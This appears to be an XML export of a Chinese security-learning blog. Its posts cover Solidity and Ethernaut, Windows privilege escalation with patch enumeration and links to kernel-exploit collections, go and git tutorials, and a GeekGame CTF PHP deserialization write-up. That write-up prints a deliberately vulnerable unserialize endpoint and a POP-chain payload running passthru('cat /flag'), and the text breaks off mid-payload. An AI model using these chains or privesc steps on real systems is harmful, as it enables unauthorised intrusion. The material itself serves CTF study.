title="数据类型"></a>数据类型</h2><p>数据类型分为一下三种：</p><ul><li>值类型（Value Types）</li><li>引用类型（Reference Types）</li><li>映射类型（Mapping Types）</li></ul><p><strong>引用类型</strong></p><p>引用类型包括<strong>数组</strong> 和<strong>结构体</strong>。</p><p>在定义引用类型时，有一个额外属性来标识数据的存储位置，这个属性有：</p><ul><li>memory（内存）： 变量在运行时存在，其生命周期只存在于函数调用期间。</li><li>storage（存储）：保存状态变量，只要合约存在就一直保存在区块链中。</li><li>calldata（调用数据）：用来存储函数参数的特殊数据位置，用来接收外部数据，是一个不可修改的、非持久的函数参数存储区域。</li></ul><p><strong>映射类型</strong></p><p>映射类型和Java的Map、Python的Dict在功能上差不多，它是一种键值对的映射关系存储结构，定义方式为mapping(KT &#x3D;&gt; KV)。</p><h2 id="地址类型"><a href="#地址类型" class="headerlink" title="地址类型"></a>地址类型</h2><h1 id="Ethernaut"><a href="#Ethernaut" class="headerlink" title="Ethernaut"></a>Ethernaut</h1><p>这里通过该靶场来学习只能合约安全，先从<strong>Hello Ethernaut</strong>看起</p><h2 id="Hello-Ethernaut"><a href="#Hello-Ethernaut" class="headerlink" title="Hello Ethernaut"></a>Hello Ethernaut</h2>]]></content>
      
      
      <categories>
          
          <category> 区块链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF BC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 提权</title>
      <link href="/2024/02/29/Windows-%E6%8F%90%E6%9D%83/"/>
      <url>/2024/02/29/Windows-%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows权限划分"><a href="#Windows权限划分" class="headerlink" title="Windows权限划分"></a>Windows权限划分</h1><p>在Windows中，有User、Administrator、System、TrustedInstaller这四种用户权限，其权限从左到右依次升高。</p><p>权限提升分为下面两类：</p><ul><li>纵向提取：低权限用户获得高权限用户的权限</li><li>横向提权：获得同级别角色的权限</li></ul><p><strong>常用提权方法</strong></p><ul><li>Windows系统内核溢出漏洞提权</li><li>错误系统配置提权</li><li>数据库提权</li><li>等等~</li></ul><h1 id="Windows系统内核溢出漏洞提权"><a href="#Windows系统内核溢出漏洞提权" class="headerlink" title="Windows系统内核溢出漏洞提权"></a>Windows系统内核溢出漏洞提权</h1><p>溢出漏洞是一种计算机程序的可更正性缺陷。溢出漏洞的全名:缓冲区溢出漏洞。因为它是在程序执行的也是攻击者时候在缓冲区执行的错误代码，所以叫缓冲区溢出漏洞。缓冲溢出是最常见的内存错误之一，入侵系统时所用到的最强大、最经典的一类漏洞利用方式。成功地利用缓冲区溢出漏洞可!修改内存中变量的值，甚至可以劫持进程，执行恶意代码，最终获得主机的控制权。利用Windows系统内核溢出漏洞提权是一种很通用的提权方法，攻击者通常可以使用该方法绕过系统中的所有安全限制。攻击者利用该漏洞的关键是目标系统有没有及时安装补丁，如果目标系统没有安装某一漏洞的补丁且存在该漏洞的话，攻击者就会向目标系统上传本地溢出程序，溢出Administrator权限。</p><h2 id="手动查看系统漏洞"><a href="#手动查看系统漏洞" class="headerlink" title="手动查看系统漏洞"></a>手动查看系统漏洞</h2><p>获得一个普通用户的shell之后，我们可以用一些命令来查看系统有哪些补丁</p><ol><li><p>systeminfo</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240229111338484.png" alt="image-20240229111338484"></p></li><li><p>wmic qfe get caption,description,hotfixid,installedon</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240229111417594.png" alt="image-20240229111417594"></p></li></ol><h2 id="提权辅助工具"><a href="#提权辅助工具" class="headerlink" title="提权辅助工具"></a>提权辅助工具</h2><ol><li><p><strong>使用Windows-Exploit-Suggester解析systeminfo</strong>：<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></p><p>该工具可以解析systeminfo出来的数据看是否存在漏洞</p><p>使用步骤：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">./windows-exploit-suggester.py --update  #用来更新漏洞库<br>pip install xlrd --upgrade  #如果没有该依赖可以进行安装<br>./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt  #提供我们保存的systeminfo输出的文本文件，然后指向微软数据库<br></code></pre></td></tr></table></figure></li><li><p>Windows提权漏洞合集：<a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p></li><li><p>各大平台提权工具：<a href="https://github.com/klsfct/getshell">https://github.com/klsfct/getshell</a></p></li></ol><h1 id="系统权限配置错误"><a href="#系统权限配置错误" class="headerlink" title="系统权限配置错误"></a>系统权限配置错误</h1>]]></content>
      
      
      <categories>
          
          <category> 提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell学习</title>
      <link href="/2024/02/29/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/02/29/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>go get小坑</title>
      <link href="/2024/02/27/go-get%E5%B0%8F%E5%9D%91/"/>
      <url>/2024/02/27/go-get%E5%B0%8F%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<h1 id="gin框架安装"><a href="#gin框架安装" class="headerlink" title="gin框架安装"></a>gin框架安装</h1><p>尝试本地去跑一个go项目时，在导入包时提示找不到路径找不到对应的包</p><p>先用下列命令开启了环境变量GO111MODULE&#x3D;on，不然go get不了</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">go env -w GO111MODULE=on<br></code></pre></td></tr></table></figure><p>然后get相应的包</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">go get -u github.com/chromedp/chromedp<br>go get -u github.com/gin-gonic/gin<br>go get -u golang.org/x/net/html<br></code></pre></td></tr></table></figure><p>再go build源码时就出现了下面的错误</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">main.go:13:2: cannot find package &quot;github.com/chromedp/chromedp&quot; in any of: D:\go\src\github.com\chromedp\chromedp (from $GOROOT) C:\Users\86189\go\src\github.com\chromedp\chromedp (from $GOPATH)<br></code></pre></td></tr></table></figure><h1 id="查看环境变量"><a href="#查看环境变量" class="headerlink" title="查看环境变量"></a>查看环境变量</h1><p>用下面命令查看go环境变量</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">go env<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240227171305349.png" alt="image-20240227171305349"></p><p>发现gopath没有指向我安装时设置的环境变量，去环境变量设置的地方查看一下<img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240227171421124.png" alt="image-20240227171421124"></p><p>会发现用户变量还有一个gopath指向默认的地方，删掉即可</p><p>现在再使用go env查看一下，发现成功修改</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240227171518116.png" alt="image-20240227171518116"></p><p>然后再去重新get一遍即可</p><blockquote><p>开启了环境变量GO111MODULE&#x3D;on，会将go get的文件下载到GOPATH&#x2F;pkg&#x2F;mod里</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git学习</title>
      <link href="/2024/01/25/git%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/01/25/git%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="Git学习"><a href="#Git学习" class="headerlink" title="Git学习"></a>Git学习</h1><p>这里还有一个很好的总结网站：<a href="https://mp.weixin.qq.com/s/Q_O0ey4C9tryPZaZeJocbA">https://mp.weixin.qq.com/s/Q_O0ey4C9tryPZaZeJocbA</a></p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ol><li>git在实际开发中的运用场景非常多，比如：备份，代码还原，协同开发，追溯问题代码的编写人和时间。</li></ol><p>&#x3D;&#x3D;版本控制器的方式&#x3D;&#x3D;</p><blockquote><p>a.集中式版本控制工具，比如：svn，cvs</p><p>b.分布式版本控制工具，比如：git</p><p>二者的差别很大，集中式中，版本库是存放在中央服务器中的，需要的代码都是提交到中央服务器或从中央服务器下载；分布式中则没有中央服务器，会有一个共享服务器，每台电脑都有自己的本地仓库存放着自己的一个完整的版本库。</p></blockquote><h2 id="git的配置"><a href="#git的配置" class="headerlink" title="git的配置"></a>git的配置</h2><p>&#x3D;&#x3D;设置用户信息&#x3D;&#x3D;</p><p><img src="https://gitee.com/ljc0033/magic/raw/master/%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E9%85%8D%E7%BD%AE.png"></p><blockquote><p>当不跟设置信息的名称时就是查询用户的信息</p></blockquote><h2 id="给常用命令设置一个别名"><a href="#给常用命令设置一个别名" class="headerlink" title="给常用命令设置一个别名"></a>给常用命令设置一个别名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#创建一个.bashrc文件，在里面设置别名</span><br><span class="hljs-built_in">touch</span> ~/.bashrc<br>vim .bashrc<br><span class="hljs-built_in">source</span> ~/.bashrc<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljc0033/magic/raw/master/%E8%AE%BE%E7%BD%AE%E5%88%AB%E5%90%8D.png"></p><h2 id="获取本地仓库"><a href="#获取本地仓库" class="headerlink" title="获取本地仓库"></a>获取本地仓库</h2><ol><li>新建一个目录作为本地仓库，这里直接在桌面建一个git_test目录</li><li>用 git init 初始化本地仓库<img src="https://gitee.com/ljc0033/magic/raw/master/%E6%9C%AC%E5%9C%B0%E4%BB%93%E5%BA%93.png"></li></ol><p>​         能看到.git文件就成功了</p><h2 id="git的常用命令"><a href="#git的常用命令" class="headerlink" title="git的常用命令"></a>git的常用命令</h2><p>Git工作目录下对于文件的修改会存在几个状态(除了.git目录的都叫工作目录)</p><p><img src="https://gitee.com/ljc0033/magic/raw/master/%E5%B7%A5%E4%BD%9C%E7%8A%B6%E6%80%81.png"></p><p>接下来新建一个file01.txt文件来进行测试命令，用touch指令</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看git状态</span><br>git status<br><span class="hljs-comment">#添加到缓存区</span><br>git add file01.txt        <span class="hljs-comment">#也可以用.通配符，表示添加所有</span><br><span class="hljs-comment">#提交到仓库</span><br>git commit -m <span class="hljs-string">&quot;注释&quot;</span><br><span class="hljs-comment">#查看历史日志</span><br>git <span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljc0033/magic/raw/master/%E5%B7%A5%E4%BD%9C%E7%8A%B6%E6%80%81%E6%94%B9%E5%8F%98.png"></p><blockquote><p>git log [option]还有更多的参数，这里详细列出来</p><ul><li>–all  显示所有分支</li><li>–pretty&#x3D;oneline   将提交信息显示为一行</li><li>–abbrev-commit  使得输出的commitid更简短</li><li>–graph     以图的形式显示</li></ul></blockquote><p>&#x3D;&#x3D;版本回退&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git reset --hard commitID<br><span class="hljs-comment">#查看已经删除的记录</span><br>git reflog     <span class="hljs-comment">#这个可以查看所有操作记录</span><br></code></pre></td></tr></table></figure><blockquote><p>commitID可以用git log查看</p></blockquote><p><img src="https://gitee.com/ljc0033/magic/raw/master/%E7%89%88%E6%9C%AC%E5%9B%9E%E9%80%80.png"></p><p>&#x3D;&#x3D;添加文件至忽略&#x3D;&#x3D;</p><p>有些文件我们不需要git管理，可以将他们添加到gitignore文件中即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> .gitignore<br></code></pre></td></tr></table></figure><p>一些示例<img src="https://gitee.com/ljc0033/magic/raw/master/%E5%BF%BD%E7%95%A5%E5%88%97%E8%A1%A8.png"></p><h2 id="git分支"><a href="#git分支" class="headerlink" title="git分支"></a>git分支</h2><p>几乎所有的版本控制系统都以某种形式支持分支。 使用分支意味着你可以把你的工作从开发主线上分离开来， 以免影响开发主线。</p><ul><li><p>常用分支相关命令</p><ul><li><p>查看本地分支</p><p>git branch</p></li><li><p>创建本地分支</p><p>git branch 分支名</p></li><li><p>切换分支</p><p>git checkout 分支名</p><p>git checkout -b 分支名  (直接切换到一个不存在的分支并创建该分支)</p></li><li><p>合并分支</p><p>一个分支上的提交可以合并到另一个分支</p><p>git merge 分支名称</p><blockquote><p>比如dev分支要合并到master需要先切换到master主线，再get merge dev</p></blockquote></li><li><p>删除分支</p><p><strong>不能删除当前分支，只能删除其他分支</strong></p><p>git branch -d b1  删除分支时，需要做各种检查</p><p>git branch -D b1 不做任何检查，强制删除</p></li></ul></li></ul><h2 id="git远程仓库"><a href="#git远程仓库" class="headerlink" title="git远程仓库"></a>git远程仓库</h2><p>这是一个总结的工作流程图：<img src="https://gitee.com/ljc0033/magic/raw/master/image-20240123132413459.png" alt="image-20240123132413459"></p><h3 id="使用ssh绑定gitee"><a href="#使用ssh绑定gitee" class="headerlink" title="使用ssh绑定gitee"></a>使用ssh绑定gitee</h3><ol><li><p>用git来绑定gitee：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//生成ssh公钥，可以使用-f参数指定生成的文件名，比如：-f &quot;id_rsa_gitee&quot;<br>ssh-keygen -t rsa//生成的ssh密钥会默认在~/.ssh下面，如果生成过了也会直接覆盖，所以有多个密钥时要记得备份(在Windows的c盘用户目录下可以找到)<br></code></pre></td></tr></table></figure></li><li><p>Gitee设置公钥</p><p>将~&#x2F;.ssh下的id_rsa.pub公钥复制到下面的地方</p><p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125154416297.png" alt="image-20240125154416297"></p></li><li><p>绑定之后可以去验证ssh能否连接到gitee，这里选择用在~&#x2F;.ssh下新建一个config文件来配置，这样可以连接gitee也行、github也行，参考这篇文章：<a href="https://blog.csdn.net/weixin_40402743/article/details/124484633">https://blog.csdn.net/weixin_40402743/article/details/124484633</a></p><p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125170039569.png" alt="image-20240125170039569"></p><p>config文件中的配置如下，我配github的时候配置了邮箱，gitee则没有</p><p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125170137353.png" alt="image-20240125170137353"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#github<br>Host github.com<br>User &lt;生成密钥时指定的邮箱邮箱&gt;<br>Hostname ssh.github.com<br>PreferredAuthentications publickey<br>IdentityFile ~/.ssh/id_rsa_github<br>Port 443<br><br>#gitee<br>Host gitee.com<br>HostName gitee.com<br>PreferredAuthentications publickey<br>IdentityFile ~/.ssh/id_rsa_gitee<br></code></pre></td></tr></table></figure><p>使用<strong>ssh -T <a href="mailto:&#103;&#x69;&#116;&#64;&#x67;&#105;&#116;&#x65;&#101;&#46;&#99;&#111;&#x6d;">&#103;&#x69;&#116;&#64;&#x67;&#105;&#116;&#x65;&#101;&#46;&#99;&#111;&#x6d;</a></strong>验证<img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125170434757.png" alt="image-20240125170434757"></p></li></ol><h3 id="远程仓库操作"><a href="#远程仓库操作" class="headerlink" title="远程仓库操作"></a>远程仓库操作</h3><p><strong>添加远程仓库</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">git remote add &lt;起的名字&gt; &lt;仓库地址&gt;<br>//git remote 可以查看当前的远程仓库<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125174304783.png" alt="image-20240125174304783"></p><p><strong>推送远程仓库</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">git push &lt;自己命名的名称&gt; &lt;分支&gt;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125180131766.png" alt="image-20240125180131766"></p><p>这是远程推送的完整指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">git push [-f] [--set-upstream] [远端名称 [本地分支名]:[远端分支名]]#如果本地和远端分支名一致就可以省略一个，像上面一样<br></code></pre></td></tr></table></figure><ul><li><p>-f表示强制推送，和远端代码修改同一块地方时可能会出现冲突。</p></li><li><p>–set-upstream：推送到远端的同时并且建立和远端分支的关联关系，这样当当前分支已经和远端分支关联时，则可以省略分支名和远端名<img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125182248016.png" alt="image-20240125182248016"></p><p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125183254456.png" alt="image-20240125183254456"></p></li></ul><p><strong>克隆远程仓库</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">git clone &lt;仓库路径&gt; [本地目录]<br></code></pre></td></tr></table></figure><p>如果没有指定目录的话，就会创建一个默认目录，比如</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">git@gitee.com:ljc0033/git_test.git<br></code></pre></td></tr></table></figure><p>就会取git_test作为目录名</p><p><strong>抓取和拉取</strong></p><ul><li><p>抓取指令：git fetch [remote name] [branch name]</p><p>抓取就是将仓库里的更新都抓取到本地，不会进行合并</p><p>如果不指定远端名称和分支名，则抓取所有分支</p></li><li><p>拉取命令：git pull [remote name] [branch name]</p><p>拉取就是将远端仓库的修改拉到本地并自动进行合并，等同于fetch+merge</p><p>如果不指定远端名称和分支名，则抓取所有并更新当前分支</p></li></ul><p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125213127428.png" alt="image-20240125213127428"></p><p>这里可以看到fetch之后的分支并没有合并到当前的master，接下来再进行 git merge origin&#x2F;master<img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125213243273.png" alt="image-20240125213243273"></p><p>可以看到成功合并了(这里可以写上分支名)，git pull就相当于合并了这两步</p><h3 id="解决冲突"><a href="#解决冲突" class="headerlink" title="解决冲突"></a>解决冲突</h3><p>当A和B修改同一个文件时会出现冲突，这里模拟一下同时修改file01.txt文件，其中一个先提交<img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125214924391.png" alt="image-20240125214924391"></p><p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125215448663.png" alt="image-20240125215448663"></p><p>这里可以看到右边想要进行合并出现了冲突，因为修改了同一块地方，再看一下file01.txt的内容<img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125215616774.png" alt="image-20240125215616774"></p><p>上面的是我们当前分支，下面的是远端分支，我们只需要在本地把他修改我们想要的样子然后提交再合并就可以了，比如这样<img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125215801079.png" alt="image-20240125215801079"></p><p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125215928798.png" alt="image-20240125215928798"></p><h2 id="git绑定GitHub账号"><a href="#git绑定GitHub账号" class="headerlink" title="git绑定GitHub账号"></a>git绑定GitHub账号</h2><ol><li><pre><code>git config --global --list  //查看自己的用户名和邮箱，注意要和github保持一致//如果不一致则自己去设置<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"><br>2. ```<br>   ssh-keygen -t rsa -C &quot;自己的邮箱&quot;//这里生成ssh的密钥，会默认在~/.ssh目录下面<br></code></pre></td></tr></table></figure>可以看到有下列文件：![image-20231103174934422](https://gitee.com/ljc0033/magic/raw/master/image-20231103174934422.png)</code></pre></li><li><p>回到github仓库添加密钥</p></li></ol><p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20231103175102389.png" alt="image-20231103175102389"></p><p>然后复制.ssh下面的.pub公钥到下面的key中<img src="https://gitee.com/ljc0033/magic/raw/master/image-20231103175214763.png" alt="image-20231103175214763"></p><ol start="4"><li><pre><code>ssh -T git@github.com //测试是否连通</code></pre><p>出现下面的结果即代表成功<img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20231103175607799.png" alt="image-20231103175607799"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化</title>
      <link href="/2023/11/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/11/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>记录一下反序列化相关的函数</p><p>这篇文章蛮好的：<a href="https://spaceman-911.gitee.io/2021/06/30/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E8%B6%85%E7%BB%86%E7%9A%84%EF%BC%89/">PHP-反序列化（超细的） | spaceman’blog (gitee.io)</a></p><p><strong>常见的魔术方法</strong></p><ul><li><p>__construct() :当对象被创建时触发</p></li><li><p>__destruct() :当对象被销毁时触发</p></li><li><p>__toString() :当对象被当作一个字符串使用时触发</p></li><li><p>__sleep() :序列化对象前调用（其返回需要是一个数组）</p></li><li><p>__wakeup() :反序列化恢复对象前调用，当字符串表示的对象属性个数大于真实个数时会跳过该函数执行</p></li><li><p>__call() :当调用对象不存在的方法时自动调用</p></li><li><p>__get() :从不可访问的属性读取数据时调用,或者不存在的属性</p></li><li><p>__invoke() :把一个实例对象当作函数使用时被调用</p></li><li><p>__clone() : 进行对象clone时被调用，用来调整对象的克隆行为</p></li><li><p>__callStatic() :调用不可访问或不存在的静态方法时自动调用</p></li><li><p>__isset() :在不可访问的属性上调用 isset() 或 empty() 时触发</p></li><li><p>__set() :当给不可访问或不存在属性赋值时被调用</p></li><li><p>__unset() :在不可访问的属性上使用 unset() 时触发</p></li><li><p>__ set_state() :</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">当调用 var_export() 导出类时，此静态方法被调用。用 __set_state() 的返回值做为 var_export() 的返回值<br></code></pre></td></tr></table></figure></li><li><p>__debuginfo() :当调用 var_dump() 打印对象时被调用（当你不想打印所有属性），适用于PHP5.6版本</p></li></ul><p><strong>php代码执行有关的函数</strong></p><ul><li><p>eval()函数：会将字符串当作php代码执行，需要以分号结尾，但比较特殊的是它不能被当作变量执行，例如：$a(“phpinfo();”),a为’eval’；这样子会报函数未定义的错误。</p><p>这里去了解一下发现：eval是因为是一个语言构造器而不是一个函数，不能被可变函数调用。</p><blockquote><p>可变函数即变量名加括号，PHP系统会尝试解析成函数，如果有当前变量中的值为命名的函数，就会调用。如果没有就报错。<br>可变函数不能用于例如：echo，print，unset()，isset()，empty()，include，require eval() 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数。</p></blockquote></li><li><p>assert()函数：也是将字符串当作php代码执行，不需要以分号结尾，但在php7.1版本后就默认不再可以执行代码了</p></li></ul><p><strong>命令执行相关函数</strong></p><ul><li>system()函数：将字符串作为OS命令执行，自带输出功能。</li><li>passthru()函数：将字符串作为OS命令执行，不需要输出执行结果，且输出全部的内容。</li><li>exec()函数：将字符串作为OS命令执行，需要输出执行结果，比如使用echo将他打印出来，且它只会输出最后一行的内容。</li><li>shell_exec()：将字符串作为OS命令执行，需要输出执行结果，且输出全部的内容。</li><li>反引号&#96;&#96;：里面的代码也会当作OS命令执行，需要输出执行结果。</li><li>popen()&#x2F;proc_open()函数：该函数也可以将字符串当作OS命令来执行，但是该函数返回的是文件指针而非命令执行结果。该函数有两个参数。</li></ul><p><code>以GeekGame的一题为例来进行学习：</code></p><h1 id="unsign"><a href="#unsign" class="headerlink" title="unsign"></a>unsign</h1><p>题目的源码如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">syc</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cuit</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;action!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$function</span>=<span class="hljs-variable language_">$this</span>-&gt;cuit;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lover</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$yxx</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$QW</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;invoke!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;yxx-&gt;QW;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">web</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eva1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$interesting</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;get!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$eva1</span>=<span class="hljs-variable language_">$this</span>-&gt;eva1;<br>        <span class="hljs-variable">$eva1</span>(<span class="hljs-variable language_">$this</span>-&gt;interesting);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) <br>&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以分析知道有三个魔术方法，分别是：**__destruct()<strong>,</strong>__invoke()<strong>,</strong>__get()**。</p><p>最终我们是要进入$eva1 里面进行命令执行，所以先给eva1和interesting变量进行赋值，注意不能赋值eval，因为eval不能动态调用，然后这是要进入到**__get()<strong>方法中才能进行命令执行，再网上看能看到lover类里面返回了变量，即我们可以通过这里访问web的实例对象不存在的属性从而触发</strong>__get()<strong>方法，看到最后访问的是QW变量，那只要设置一个web对象中不存在的属性即可；要访问该属性，我们又要触发</strong>__invoke()<strong>方法，看到有syc的</strong>__destruct()**方法返回了一个变量当作函数，那我们给这个变量传入lover对象即可；</p><p>所以调用链为这样：**__destruct()<strong>&#x3D;&gt;</strong>__invoke()<strong>&#x3D;&gt;</strong>__get()**</p><p>payload如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs PHP"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">syc</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cuit</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;action!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$function</span>=<span class="hljs-variable language_">$this</span>-&gt;cuit;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lover</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$yxx</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$QW</span>=<span class="hljs-string">&#x27;test&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;invoke!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;yxx-&gt;QW;<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">web</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eva1</span>=<span class="hljs-string">&#x27;passthru&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$interesting</span>=<span class="hljs-string">&#x27;cat /flag&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;get!&lt;br&gt;&quot;</span>);<br>        <span 